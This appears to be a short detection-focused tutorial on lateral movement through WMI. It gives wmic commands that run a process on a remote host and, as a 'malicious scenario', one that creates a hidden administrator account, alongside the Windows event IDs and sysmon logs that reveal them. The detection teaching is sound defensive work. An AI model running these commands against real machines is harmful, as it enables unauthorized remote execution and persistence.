Lateral Movement
----------------

WMI can be used to execute code on remote machines given sufficient privileges (usually administrative)

`wmic /node:10.0.0.2 /user:administrator process call create "cmd.exe /c calc"`

This command spawns calc.exe on the target 10.0.0.2

There a couple notable IOCS to detect this attack. The following will be recorded in the windows audit log on the source host
```
4624- An account was successfully logged on
4648- A logon was attempted using explicit credentials
4672- Special privileges were assigned to a new logon
```

Further sysmon will record an event ID 1 on the target host with the image: C:\Windows\System32\wbem\WMIC.exe and the full command line 
`C:\Windows\System32\wbem\WMIC.exe /node:10.0.0.2 /user:administrator process call create "cmd.exe /c calc"` will be logged.

Imagine the more malicious scenario where the attacker executes the command

`wmic /node:10.0.0.2 /user:administrator process call create "net user /add evil fake && net localgroup administrators evil /add"`

Then we'd record logs on the remote machine for 
```
4688- process create
4720- a local user account was created
4728, 4732, 4757- users being added to security enabled groups 
```
And sysmon would reveal the entire command line in an Event ID 1 log.

